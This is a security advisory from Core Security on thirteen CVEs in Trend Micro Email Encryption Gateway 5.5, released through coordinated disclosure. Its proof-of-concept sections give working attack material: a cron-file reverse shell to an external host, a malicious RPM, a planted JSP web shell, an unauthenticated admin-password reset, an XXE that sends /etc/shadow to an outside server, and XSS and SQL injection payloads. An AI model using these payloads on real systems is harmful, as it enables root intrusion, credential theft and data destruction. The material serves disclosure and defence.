@@ -1,0 +1,863 @@
+Core Security - Corelabs Advisory
+http://corelabs.coresecurity.com/
+
+Trend Micro Email Encryption Gateway Multiple Vulnerabilities
+
+1. *Advisory Information*
+
+Title: Trend Micro Email Encryption Gateway Multiple Vulnerabilities
+Advisory ID: CORE-2017-0006
+Advisory URL:
+http://www.coresecurity.com/advisories/trend-micro-email-encryption-gateway-multiple-vulnerabilities
+Date published: 2018-02-21
+Date of last update: 2018-02-21
+Vendors contacted: Trend Micro
+Release mode: Coordinated release
+
+2. *Vulnerability Information*
+
+Class: Cleartext Transmission of Sensitive Information [CWE-319],
+External Control of File Name or Path [CWE-73], Insufficient
+Verification of Data Authenticity [CWE-345], External Control of File
+Name or Path [CWE-73], Missing Authentication for Critical Function
+[CWE-306], Cross-Site Request Forgery [CWE-352], Improper Restriction of
+XML External Entity Reference [CWE-611], Improper Neutralization of
+Input During Web Page Generation ('Cross-site Scripting') [CWE-79],
+Improper Neutralization of Input During Web Page Generation ('Cross-site
+Scripting') [CWE-79], Improper Neutralization of Input During Web Page
+Generation ('Cross-site Scripting') [CWE-79], Improper Neutralization of
+Special Elements used in an SQL Command [CWE-89], Improper
+Neutralization of Special Elements used in an SQL Command [CWE-89],
+Improper Neutralization of Special Elements used in an SQL Command
+[CWE-89]
+Impact: Code execution
+Remotely Exploitable: Yes
+Locally Exploitable: Yes
+CVE Name: CVE-2018-6219, CVE-2018-6220, CVE-2018-6221, CVE-2018-6222,
+CVE-2018-6223, CVE-2018-6224, CVE-2018-6225, CVE-2018-6226,
+CVE-2018-6226, CVE-2018-6227, CVE-2018-6228, CVE-2018-6229, CVE-2018-6230
+
+3. *Vulnerability Description*
+
+Trend Micro's website states that:[1]
+     
+Encryption for Email Gateway is a Linux-based software solution providing
+the ability to perform the encryption and decryption of email at the
+corporate gateway, regardless of the email client, and the platform from
+which it originated. The encryption and decryption of email on the TMEEG
+client is controlled by a Policy Manager that enables an administrator
+to configure policies based on various parameters, such as sender and
+recipient email addresses, keywords, or PCI compliance. Encryption for
+Email Gateway presents itself as an SMTP interface and delivers email
+out over an SMTP to configured outbound MTAs. This enables easy
+integration with other email server-based products, be them content
+scanners, mail servers, or archiving solutions."
+     
+Multiple vulnerabilities were found in the Trend Micro Email Encryption
+Gateway web console that would allow a remote unauthenticated attacker
+to gain command execution as root.
+
+We also present two additional vectors to achieve code execution from a
+man-in-the-middle position.
+     
+4. *Vulnerable Packages*
+
+. Trend Micro Email Encryption Gateway 5.5 (Build 1111.00)
+Other products and versions might be affected, but they were not tested.
+
+5. *Vendor Information, Solutions and Workarounds*
+
+Trend Micro published the following Security Notes:
+
+.
+https://success.trendmicro.com/solution/1119349-security-bulletin-trend-micro-email-encryption-gateway-5-5-multiple-vulnerabilities
+
+6. *Credits*
+
+These vulnerabilities were discovered and researched by Leandro Barragan
+and Maximiliano Vidal from Core Security Consulting Services. The
+publication of this advisory was coordinated by Alberto Solino from Core
+Advisories Team.
+   
+7. *Technical Description / Proof of Concept Code*
+
+Trend Micro Email Encryption Gateway includes a web console to perform
+administrative tasks. Section 7.4 describes a vulnerability in this
+console that can be exploited to gain command execution as root. The
+vulnerable functionality is accessible only to authenticated users, but
+it is possible to combine 7.4 with the vulnerability presented in
+section 7.5 to bypass this restriction and therefore execute root
+commands from the perspective of a remote unauthenticated attacker.
+     
+The application does also use an insecure update mechanism that allows
+an attacker in a man-in-the-middle position to write arbitrary files and
+install arbitrary RPM packages, leading to remote command execution as
+the root user.
+     
+Additional Web application vulnerabilities were found, including
+cross-site request forgery (7.6), XML external entity injection (7.7),
+several cross-site scripting vulnerabilities (7.8, 7.9, 7.10), and SQL
+injection vulnerabilities (7.11, 7.12, 7.13).
+     
+7.1. *Insecure update via HTTP*
+
+[CVE-2018-6219]
+Communication to the update servers is unencrypted. The following URL is
+fetched when the application checks for updates:
+         
+/-----
+[Request #1]
+ http://downloads.privatepost.com/files/TMEEG/updates/data.html
+-----/
+
+The product expects to retrieve a plain-text file with the following
+format:
+
+/-----
+[Version Info]
+[Installation RPM file name]
+[Path to release notes]
+-----/
+
+If a new update is found, then the RPM file is downloaded from the
+following URL:
+
+/-----
+[Request #2]
+http://downloads.privatepost.com/files/TMEEG/updates/[Installation RPM
+file name]
+-----/
+
+This means that the product does not do any kind of certificate
+validation or public key pinning, which makes it easier for an attacker
+to eavesdrop and tamper the data.
+
+7.2. *Arbitrary file write leading to command execution*
+
+[CVE-2018-6220]
+The following code snippet is responsible for downloading the update
+file (com/identum/pmg/web/CheckForUpdates.java):
+         
+/-----
+FileDownload fd = new FileDownload();
+if (!fd.download(updateURLRoot + "/" + rpmFileName, "/tmp/" +
+rpmFileName)) {
+    return 10;
+}
+[...]
+-----/
+
+The rpmFileName variable is controlled by the attacker, as it is taken
+from the aforementioned update file. As a consequence, the attacker
+controls the path where the update file is going to be downloaded. The
+RPM file is written by the root user with 0644 permissions. Being able
+to write to the file system as root opens the door to several code
+execution vectors on Linux machines.
+
+In this PoC we present one vector which consist on creating a cron job
+on /etc/cron.d directory.
+         
+The attacker can send the following response to [Request #1]:
+
+/-----
+HTTP/1.1 200 OK
+Content-Type: text/html
+Server: Microsoft-IIS/7.5
+X-Powered-By: ASP.NET
+Date: Tue, 23 May 2017 14:39:46 GMT
+Connection: close
+Content-Length: 26
+
+5.7
+../../../../../../../etc/cron.d/test
+test.html
+-----/
+
+As a result, the server will create the file /etc/cron.d/test. Its
+contents are also controlled by the attacker. When the update launches,
+the appliance will download it from the following URL:
+
+/-----
+http://downloads.privatepost.com/files/TMEEG/updates/../../../../../../../etc/cron.d/test
+-----/
+
+The attacker can tamper the server's response and inject arbitrary data,
+such as a reverse shell payload:
+         
+/-----
+* * * * * root /bin/bash -i >& /dev/tcp/external_server/1080 0>&1
+-----/
+
+gaining code execution upon exploitation:
+
+/-----
+$ sudo nc -lvvp 1080
+Listening on [0.0.0.0] (family 0, port 1080)
+Connection from [server] port 1080 [tcp/socks] accepted (family 2, sport
+52171)
+bash: no job control in this shell
+[root@ localhost ~]# id
+uid=0(root) gid=0(root)
+groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+context=user_u:system_r:unconfined_t
+-----/
+
+7.3. *Unvalidated software updates*
+
+[CVE-2018-6221]
+The update mechanism described in 7.2 does not validate the RPM file
+downloaded.
+
+An attacker in a man-in-the-middle position could tamper with the RPM
+file and inject its own.
+
+The following code snippet is responsible for installing the unvalidated
+RPM (com/identum/pmg/web/CheckForUpdates.java):
+
+/-----
+try
+    {
+        System.out.println("running file:");
+        System.out.println("rpm --upgrade --nodeps /tmp/" + rpmFileName);
+
+        Process process = Runtime.getRuntime().exec("rpm --upgrade
+--nodeps /tmp/" + rpmFileName);
+        [..]
+    {
+-----/
+
+In the following Proof of Concept, we crafted a malicious RPM file that
+executes a reverse shell once opened. This can be achieved by adding a
+reverse shell script to %pre section of RPM's SPEC file, which is
+executed previous to any installation step. As can be seen, this results
+in code execution as root:
+
+/-----
+$ sudo nc -lvvp 1080
+Listening on [0.0.0.0] (family 0, port 1080)
+Connection from [server] port 1080 [tcp/socks] accepted (family 2, sport
+40445)
+bash: no job control in this shell
+[root@ localhost /]# id
+uid=0(root) gid=0(root)
+groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+context=root:system_r:rpm_script_t:SystemLow-SystemHigh
+-----/
+
+7.4. *Arbitrary logs location leading to command execution*
+
+[CVE-2018-6222]
+The location of the log files can be changed in the logConfiguration.do
+page. MimeBuildServer logs are particularly interesting because its
+contents can be controlled by an attacker.
+
+The first step is to point the log file to the Web application root. The
+following request redirects MimeBuildServer logs to
+/opt/tomcat/webapps/ROOT/pepito.jsp and enables full debug logs:
+
+/-----
+POST /logConfiguration.jsp HTTP/1.1
+Host: [server]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0)
+Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://[server]/logConfiguration.do
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 798
+Cookie: JSESSIONID=9363824A3BA637A8CC5B51955625075B
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+client0=KeyManager&warnLevel0=3&infoLevel0=1&debugLevel0=0&path0=%2Fvar%2Flog%2Fppg%2Fkeymanserver.log&client1=LauncherServer&warnLevel1=3&infoLevel1=1&debugLevel1=0&path1=%2Fvar%2Flog%2Fppg%2Flauncher.log&client2=KeyManagerClient&warnLevel2=3&infoLevel2=1&debugLevel2=0&path2=%2Fvar%2Flog%2Fppg%2Fkeymanclient.log&client3=MTAInterface&warnLevel3=3&infoLevel3=1&debugLevel3=0&path3=%2Fvar%2Flog%2Fppg%2Fmtainterface.log&client4=PolicyManagerServer&warnLevel4=3&infoLevel4=1&debugLevel4=0&path4=%2Fvar%2Flog%2Fppg%2Fpolicymanager.log&client5=SupervisorServer&warnLevel5=0&infoLevel5=3&debugLevel5=0&path5=%2Fvar%2Flog%2Fppg%2FSupervisorServer.log&client6=MimeBuilderServer&warnLevel6=3&infoLevel6=3&debugLevel6=3&path6=%2Fopt%2Ftomcat%2Fwebapps%2FROOT%2Fpepito.jsp&action=logConfiguration%3Apostback
+-----/
+
+The second step is to update the MimeBuilder configuration and insert
+arbitrary JSP code. One candidate is the "Encrypted meeting request
+email message" form.
+
+/-----
+POST /mimebuilderconfig.jsp HTTP/1.1
+Host: [server]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0)
+Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://[server]/MimeBuilderConfig.do
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 2915
+Cookie: JSESSIONID=9363824A3BA637A8CC5B51955625075B
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+addEncryptionXHeader=on&encryptionXHeader=X-TMEEG-ENCRYPTED&addDecryptionXHeader=on&decryptionXHeader=X-TMEEG-DECRYPTED&addDecryptionNotice=off&decryptionNotice=javascript%3A%2F*%3C%2Fscript%3E%3Csvg%2Fonload%3D%27%2B%2F%22%2F%2B%2Fonmouseover%3D1%2F%2B%2F%5B*%2F%5B%5D%2F%2B%28%28new%28Image%29%29.src%3D%28%5B%5D%2B%2F%5C%2Ffud3uvq5miuqpikdqya3wzicu30woofc7z2nr%5C.burpcollaborator.net%2F%29.replace%28%2F%5C%5C%2Fg%2C%5B%5D%29%29%2F%2F%27%3E&errorOnVerificationFailure=off&meetingRequestEmailText=%3C%25%40+page+import%3D%22java.util.*%2Cjava.io.*%22%25%3E%0D%0A%3C%25%0D%0A%2F%2F%0D%0A%2F%2F+JSP_KIT%0D%0A%2F%2F%0D%0A%2F%2F+cmd.jsp+%3D+Command+Execution+%28unix%29%0D%0A%2F%2F%0D%0A%2F%2F+by%3A+Unknown%0D%0A%2F%2F+modified%3A+27%2F06%2F2003%0D%0A%2F%2F%0D%0A%25%3E%0D%0A%3CHTML%3E%3CBODY%3E%0D%0A%3CFORM+METHOD%3D%22GET%22+NAME%3D%22myform%22+ACTION%3D%22%22%3E%0D%0A%3CINPUT+TYPE%3D%22text%22+NAME%3D%22cmd%22%3E%0D%0A%3CINPUT+TYPE%3D%22submit%22+VALUE%3D%22Send%22%3E%0D%0A%3C%2FFORM%3E%0D%0A%3Cpre%3E%0D%0A%3C%25%0D%0Aif+%28request.getParameter%28%22cmd%22%29+%21%3D+null%29+%7B%0D%0A++++++++out.println%28%22Command%3A+%22+%2B+request.getParameter%28%22cmd%22%29+%2B+%22%3CBR%3E%22%29%3B%0D%0A++++++++Process+p+%3D+Runtime.getRuntime%28%29.exec%28request.getParameter%28%22cmd%22%29%29%3B%0D%0A++++++++OutputStream+os+%3D+p.getOutputStream%28%29%3B%0D%0A++++++++InputStream+in+%3D+p.getInputStream%28%29%3B%0D%0A++++++++DataInputStream+dis+%3D+new+DataInputStream%28in%29%3B%0D%0A++++++++String+disr+%3D+dis.readLine%28%29%3B%0D%0A++++++++while+%28+disr+%21%3D+null+%29+%7B%0D%0A++++++++++++++++out.println%28disr%29%3B+%0D%0A++++++++++++++++disr+%3D+dis.readLine%28%29%3B+%0D%0A++++++++++++++++%7D%0D%0A++++++++%7D%0D%0A%25%3E%0D%0A%3C%2Fpre%3E%0D%0A%3C%2FBODY%3E%3C%2FHTML%3E%0D%0A%0D%0A&encryptionVersion=zd&replyToSender=on&replyToAll=on&replyForward=on&zdMainTemplate=EncryptedMessageTemplate.html&zdAttachmentTemplate=EncryptedAttachmentTemplate.html&zdAttachmentPayloadTemplate=EncryptedAttachmentPayloadTemplate.html&preProcessMaxBlockSize=1914&preProcessMainDelimeter=%22%5C%3E%0D%0A%3Cinput+type%3D%22hidden%22+name%3D%22ibeMessage%22+id%3D%22ibeMessagePart__%5BAUTONUM%5D__%22+value%3D%22%0D%0A&preProcessInlineDelimeter=%22%5C%3E%0D%0A%3Cinput+type%3D%22hidden%22+name%3D%22ibeInline%22+id%3D%22ibeInlinePart__%5BAUTONUM%5D__%22+value%3D%22%0D%0A&b64EncodeAttachments=off&replyToSenderZdv4=on&replyToAllZdv4=on&replyForwardZdv4=on&zdMainTemplateZdv4=V4EncryptedMessageTemplate.htmlbt0ly&preProcessMaxBlockSizeZdv4=1914&preProcessMainDelimeterZdv4=%22%3E+%3Cinput+type%3D%22hidden%22+name%3D%22ibeMessage%22+id%3D%22ibeMessagePart__%5BAUTONUM%5D__%22+value%3D%22&preProcessInlineDelimeterZdv4=%22%3E+%3Cinput+type%3D%22hidden%22+name%3D%22ibeInline%22+id%3D%22ibeInlinePart__%5BAUTONUM%5D__%22+value%3D%22&b64EncodeAttachmentsZdv4=off&maxProcessThreads=10&mimeBuilderAction=mimeconfig%3Apostback
+-----/
+
+The next time the service components are restarted, the log file will be
+created with the desired JSP code.
+
+With the sample JSP code from the previous request, the attacker would
+then navigate to pepito.jsp and execute arbitrary commands as root:
+
+/-----
+https://[server]/pepito.jsp?cmd=id
+
+Command: id
+
+uid=0(root) gid=0(root) context=system_u:system_r:java_t
+-----/
+
+7.5. *Missing authentication for appliance registration*
+
+[CVE-2018-6223]
+The registration endpoint is provided for system administrators to
+configure the virtual appliance upon deployment. However, this endpoint
+remains accessible without authentication even after the appliance is
+configured, which would allow attackers to set configuration parameters
+such as the administrator username and password.
+      
+The following request changes the administrator password to "sombrero":
+
+/-----
+POST /register.jsp HTTP/1.1
+Host: [server]
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 414
+
+action=register%3Apostback&activationCode1=EE&activationCode2=XXXX&activationCode3=XXXX&activationCode4=XXXX&activationCode5=XXXX&activationCode6=XXXX&activationCode7=XXXX&resellerCode=&hostName=tester.localdomain&regEmail=pentester1@coresecurity.com&contactName=Test+Test&contactEmail=pentester1@coresecurity.com&contactPhone=%2B5491145712447&userName=administrator&password=sombrero&confirmPassword=sombrero
+-----/
+
+Note that a valid activation code is required. This code can be easily
+obtained by requesting a trial from Trend Micro's website.
+
+7.6. *Lack of cross-site request forgery protection*
+
+[CVE-2018-6224]
+There are no Anti-CSRF tokens in any forms on the Web interface. This
+would allow an attacker to submit authenticated requests when an
+authenticated user browses an attacker-controlled domain.
+
+This vulnerability can be chained with 7.4 and lead to remote command
+execution. It could also be abused to force updates once the attacker is
+in a man-in-the-middle position to exploit 7.2 or 7.3, which would also
+lead to remote command execution.
+
+The following proof of concept starts the check for updates process.
+
+/-----
+<html>
+  <body>
+  <script>history.pushState('', '', '/')</script>
+    <form action="https://[server]/checkForUpdates.do">
+      <input type="submit" value="Submit request" />
+    </form>
+  </body>
+</html>
+-----/
+
+7.7. *XML external entity injection in configuration.jsp*
+
+[CVE-2018-6225]
+The pciExceptionXml parameter of the configuration.jsp script is
+vulnerable to XML external entity injection.
+
+The following proof of concept uses external entities to send the
+/etc/shadow file to an external server.
+
+/-----
+POST /configuration.jsp HTTP/1.1
+Host: [server]
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0)
+Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 938
+Cookie: JSESSIONID=E8357364AE748ACB904BE6E34F47F2DB
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+       
+incomingPort=25&externalHost=&outboundExternalPort=25&internalHost=&outboundInternalPort=25&pciUseSemantics=on&pciScanAttachments=on&pciExceptionbetween0=on&pciExceptionbetween1=on&pciExceptionText0=on&enabledInput=on&exceptionInput=&enabledInput=on&editExceptionInput=&enabledInput=on&startInput=&endInput=&enabledInput=on&startInput=&endInput=&action=configuration%3Apostback&pciExceptionXml=<%3fxml+version%3d"1.0"+encoding%3d"utf-8"%3f>
+<!DOCTYPE+roottag+[
++<ENTITY+%25+file+SYSTEM+"file%3a///etc/shadow">
++<!ENTITY+%25+dtd+SYSTEM+"http%3a//external_server/combine.dtd">
+%25dtd%3b]>
+<ci_exceptions><pci_exception+enabled%3d"true"><tart><[CDATA[<head>]]>%26send%3b</start><end></head>]]></end></pci_exception><pci_exception+enabled%3d"true"><start><![CDATA[<style></start><end></style></end></pci_exception><pci_exception+enabled%3d"true"><start><head/></start></pci_exception></pci_exceptions>
+-----/
+
+The combine.dtd file is hosted on an external server, and its contents
+are:
+
+/-----
+<?xml version="1.0" encoding="UTF-8"?>
+<!ENTITY % all "<!ENTITY send SYSTEM
+'gopher://external_server:1080/?%file;'>">
+%all;
+
+$ sudo nc -lvvp 1080
+Listening on [0.0.0.0] (family 0, port 1080)
+Connection from [server] port 1080 [tcp/socks] accepted (family 2, sport
+49676)
+root:$1$8PtHrAEM$DmIkWpxYSOzhM0KLJGZvY/:14090:0:99999:7:::
+bin:*:14089:0:99999:7:::
+daemon:*:14089:0:99999:7:::
+adm:*:14089:0:99999:7:::
+lp:*:14089:0:99999:7:::
+sync:*:14089:0:99999:7:::
+shutdown:*:14089:0:99999:7:::
+halt:*:14089:0:99999:7:::
+mail:*:14089:0:99999:7:::
+news:*:14089:0:99999:7:::
+uucp:*:14089:0:99999:7:::
+operator:*:14089:0:99999:7:::
+games:*:14089:0:99999:7:::
+gopher:*:14089:0:99999:7:::
+ftp:*:14089:0:99999:7:::
+nobody:*:14089:0:99999:7:::
+rpm:!!:14089:0:99999:7:::
+dbus:!!:14089:0:99999:7:::
+exim:!!:14089:0:99999:7:::
+nscd:!!:14089:0:99999:7:::
+vcsa:!!:14089:0:99999:7:::
+rpc:!!:14089:0:99999:7:::
+sshd:!!:14089:0:99999:7:::
+pcap:!!:14089:0:99999:7:::
+haldaemon:!!:14089:0:99999:7:::
+postgres:!!:14090::::::
+tomcat:!!:14090:0:99999:7:::
+xfs:!!:14179::::::
+postfix:!!:14194::::::
+-----/
+
+These actions require the user to be authenticated within the Web
+console, so an attacker would need to obtain valid credentials first.
+Possible vectors to achieve this include exploiting any of the XSS
+issues described in 7.8, 7.9 and 7.10, or leveraging the XSRF
+vulnerability described in 7.6.
+
+7.8. *Reflected cross-site scripting in keymanserverconfig.jsp*
+
+[CVE-2018-6226]
+The deniedKeysExpireTimeout and keyAge parameters of the
+keymanserverconfig.jsp script are vulnerable to cross-site scripting.
+
+The following is a proof of concept to demonstrate the vulnerability:
+
+/-----
+https://[server]/keymanserverconfig.jsp?keyAge=3&keyAgeUnits=m&deniedKeysExpireTimeout=6000yta9q%22%3e%3cscript%3ealert(1)%3c%2fscript%3ekb4w2xa9v0d&keymanServerAction=kmsconfig%3Apostback
+-----/
+
+7.9. *Reflected cross-site scripting in mimebuilderconfig.jsp*
+
+[CVE-2018-6226]
+The following parameters of the mimebuilderconfig.jsp script are
+vulnerable to cross-site scripting: decryptionXHeader, encryptionXHeader,
+meetingRequestEmailText, zdAttachmentPayloadTemplate, zdAttachmentTemplate,
+zdMainTemplate, zdMainTemplateZdv4.
+
+The following is a proof of concept to demonstrate the vulnerability:
+
+/-----
+https://[server]/mimebuilderconfig.jsp?zdMainTemplateZdv4=%22%3E%3Cscript%3Ealert(1)%3C/script%3E
+-----/
+
+7.10. *Stored cross-site scripting in editPolicy.jsp*
+
+[CVE-2018-6227]
+The hidEmails parameter of the editPolicy.jsp script is vulnerable to
+cross-site scripting.
+
+The following request adds a policy for the email address
+"<script>alert(1)</script>":
+
+/-----
+POST /editPolicy.jsp HTTP/1.1
+Host: [server]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0)
+Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://[server]/policies.jsp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 136
+Cookie: JSESSIONID=7D25474429E52C823C63357255A5E781
+DNT: 1
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+action=editPolicy%3Apostback&hidEmails=<script>alert(1)</script>&hidConditions=&hidRuleId=1&hidDelete=&ruleResult=3&ruleTarget=3&envId=1
+-----/
+
+The input will be stored unescaped and rendered every time the policies.do
+script is executed.
+
+Excerpt of the policies.do source showing the injected script tag:
+
+/-----
+<tr>
+<td ondblclick="edit_policy(this);" style="border:solid 1px
+#AAAAAA;background-color:#F5F5F5;cursor:move;"
+    onmousedown="mouse_down(this, event);" onmouseup="mouse_up(this);"
+onmouseout="mouse_out(this);"
+    onmousemove="mouse_move(this, event);">Don't decrypt messages to
+<script>alert(1)</script>
+-----/
+
+7.11. *SQL injection in policies.jsp*
+
+[CVE-2018-6228]
+The hidEditId parameter of the policies.jsp script is not sanitized,
+leading to SQL injection.
+
+As can be seen in the following excerpt, the script reads a parameter
+named hidEditId and forwards it to the editPolicy.jsp script if it is
+not set to -1.
+
+From webapps/ROOT/policies.jsp:
+
+/-----
+<% if (request.getParameter("hidEditId") != null)
+    if (request.getParameter("hidEditId").compareTo("-1") != 0)
+    {
+        String hid_edit_id = request.getParameter("hidEditId");
+    %><jsp:forward page="editPolicy.jsp"><jsp:param name="editRuleId"
+value="<%= hid_edit_id %>"/></jsp:forward><%
+    }
+[...]
+-----/
+
+The editPolicy.jsp script will pass this parameter without any
+modification to the loadRuleDetails method, which is defined in the
+formEditPolicy class
+
+From webapps/ROOT/editPolicy.jsp:
+       
+/-----
+if (request.getParameter("editRuleId") != null)
+frm.loadRuleDetails(request.getParameter("editRuleId"));
+[...]
+-----/
+
+Finally, the loadRuleDetails method will use the unsanitized parameter
+it receives to build a dynamic SQL statement as follows:
+
+From webapps/ROOT/WEB-INF/classes/com/identum/pmg/web/formEditPolicy:
+
+/-----
+public boolean loadRuleDetails(String ruleId)
+{
+    _databaseError = false;
+
+
+    try
+    {
+        _ruleId = ruleId;
+        _ruleResultId = dataStore.getRuleResultId(ruleId);
+        _ruleForId = dataStore.getRuleForId(ruleId);
+        _ruleEmails = dataStore.getRuleAddreses(ruleId);
+        _ruleSubRules = dataStore.getSubRules(ruleId);
+    [...]
+
+public String getRuleResultId(String ruleId) throws SQLException
+{
+    Connection cnn = MySQLClient.GetInstance().GetConnection();
+    Statement query = cnn.createStatement();
+    String ruleResultId = "";
+
+    ResultSet rs = null;
+
+    try
+    {
+        rs = query.executeQuery("SELECT RuleResultId FROM RulesEngine
+WHERE Id = " + ruleId);
+    [...]
+-----/
+
+The contents of ruleId will be appended to the SELECT query, resulting
+in a SQL injection.
+
+The following PoC opens a policy to edit, even though the hidEditId
+parameter is invalid. Due to the "always true" comparison, the first
+element is retrieved:
+
+/-----
+POST /policies.jsp HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0)
+Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 84
+Referer: https://server/editPolicy.jsp
+Cookie: JSESSIONID=4CFE9B6E37DFABC16AF5D6F091F1A0E2
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+action=policies%3Apostback&hidSequence=&hidEditId=178275005%20or%201%3d1%20LIMIT%201
+-----/
+
+7.12. *SQL injection in editPolicy.jsp*
+
+[CVE-2018-6229]
+The hidRuleId parameter of the editPolicy.jsp script is not sanitized,
+leading to SQL injection in a DELETE statement.
+
+The following excerpt shows that the request object is forwarded to the
+DeletePolicy method implemented in the formEditPolicy class.
+
+From webapps/ROOT/editPolicy.jsp:
+
+/-----
+<% if (frm.isPostBack())
+{
+    if (request.getParameter("hidDelete").compareTo("YES") == 0)
+    {
+        frm.DeletePolicy(request);
+    }
+[...]
+-----/
+
+DeletePolicy reads the hidRuleId parameter and calls deletePolicy with
+it, without doing any sanitization.
+
+From webapps/ROOT/WEB-INF/classes/com/identum/pmg/web/formEditPolicy:
+
+/-----
+public boolean DeletePolicy(HttpServletRequest request)
+{
+    String ruleId = request.getParameter("hidRuleId");
+    boolean success = dataStore.deletePolicy(ruleId);
+    _databaseError = (!success);
+
+    return success;
+}
+-----/
+
+Finally, the JPostgresDataHelper class uses the ruleId parameter to
+build dynamic SQL statements, as can be seen in the following extract.
+       
+From webapps/ROOT/WEB-INF/classes/com/identum/pmg/data/JPostgresDataHelper:
+
+/-----
+public boolean deletePolicy(String ruleId)
+{
+  Connection cnn = null;
+  Statement query = null;
+
+  boolean bSuccess = true;
+
+  try
+  {
+      cnn = MySQLClient.GetInstance().GetConnection();
+      cnn.setAutoCommit(false);
+      query = cnn.createStatement();
+
+      query.executeUpdate("DELETE FROM RulesEmailIndex WHERE
+RulesEngineId = " + ruleId);
+      query.executeUpdate("DELETE FROM SubRuleIndex WHERE RulesEngineId
+= " + ruleId);
+      query.executeUpdate("DELETE FROM RulesEngine WHERE Id = " + ruleId);
+  [...]
+-----/
+
+The ruleId parameter will be appended as-is to the DELETE statements,
+resulting in a SQL injection.
+
+The following request will cause the RulesEmailIndex, SubRuleIndex, and
+RulesEngine tables to be truncated:
+
+/-----
+POST /editPolicy.jsp HTTP/1.1
+Host: [server]
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:53.0)
+Gecko/20100101 Firefox/53.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Referer: https://[server]/policies.jsp
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 133
+Cookie: JSESSIONID=2B363A12C93CA038322EE551890FF30F
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+action=editPolicy%3Apostback&hidEmails=&hidConditions=&hidRuleId=223+OR++'1+'%3d+'1+'&hidDelete=YES&ruleResult=3&ruleTarget=3&envId=1
+-----/
+
+
+7.13. *SQL Injection in emailSearch.jsp*
+
+[CVE-2018-6230]
+The SearchString parameter of the emailSearch.jsp script is not
+sanitized, leading to a SQL injection.
+
+As can be seen in the following excerpt, the emailSearch.jsp script
+reads a parameter named SearchString and calls the getResults method
+defined in the wsEmailSearch class.
+
+From webapps/ROOT/emailSearch.jsp:
+
+/-----
+if (session.getAttribute("UserName") != null)
+{
+    response.setContentType("text/xml");
+    ws.setSearchParam(request.getParameter("SearchString"));
+    java.util.Vector res = ws.getResults();
+    [...]
+-----/
+
+The searchParam property is not sanitized before being used to build a
+dynamic SQL query, resulting in a SQL injection in the SELECT statement.
+       
+From webapps/ROOT/WEB-INF/classes/com/identum/pmg/web/wsEmailSearch:
+
+/-----
+public class wsEmailSearch
+{
+    private String _searchParam = "";
+    public void setSearchParam(String searchParam) { _searchParam =
+searchParam; }
+
+    public Vector getResults()
+    {
+        Vector res = new Vector();
+
+        Connection cnn = MySQLClient.GetInstance().GetConnection();
+        try
+        {
+            Statement query = cnn.createStatement();
+
+            ResultSet rs = query.executeQuery("SELECT address FROM
+RulesEmailAddresses WHERE address LIKE '%" + _searchParam + "%' ORDER BY
+address");
+[...]
+-----/
+
+The following proof of concept will cause all the e-mails on the
+database to be retrieved:
+
+/-----
+POST /emailSearch.jsp HTTP/1.1
+Host: server
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0)
+Gecko/20100101 Firefox/53.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Content-Type: application/x-www-form-urlencoded
+Referer: https://server/policies.jsp
+Content-Length: 39
+Cookie: JSESSIONID=4CFE9B6E37DFABC16AF5D6F091F1A0E2
+Connection: close
+
+SearchString=' OR '%1%'='%1
+-----/
+
+8. *Report Timeline*
+2017-06-05: Core Security sent an initial notification to Trend Micro,
+including a draft advisory.
+2017-06-05: Trend Micro confirmed reception of advisory and informed
+they will submit it to the relevant technical team for validation and
+replication.
+2017-06-22: Core Security asked for an update on the vulnerability
+reported.
+2017-06-22: Trend Micro answered saying the cases are still being vetted
+and that they will commit a time when the solution is finalized.
+2017-08-28: Core Security asked again for an update on the vulnerability
+reported.
+2017-08-28: Trend Micro answered saying the team is still in the process
+of creating the official fix for the vulnerabilities, although there is
+still no official release date.
+2017-10-02: Core Security asked again for an update on the vulnerability
+reported.
+2017-10-02: Trend Micro answered saying the team are still finalizing
+the fix to ensure all vulnerabilities are covered.
+2017-11-13: Core Security asked again (4th time) for an ETA for the
+official fix. We stated we need a release date or a thorough explanation
+on why after five months there is still no date defined. If there is no
+such answer we will be forced to publish the advisory.
+2017-11-14: Trend Micro answered saying the team is still working on two
+vulnerabilities and due to the complexity and number of vulnerabilities
+overall found, their team requires more time.
+2018-01-16: Core Security asked again (5th time) for an ETA for the
+official fix.
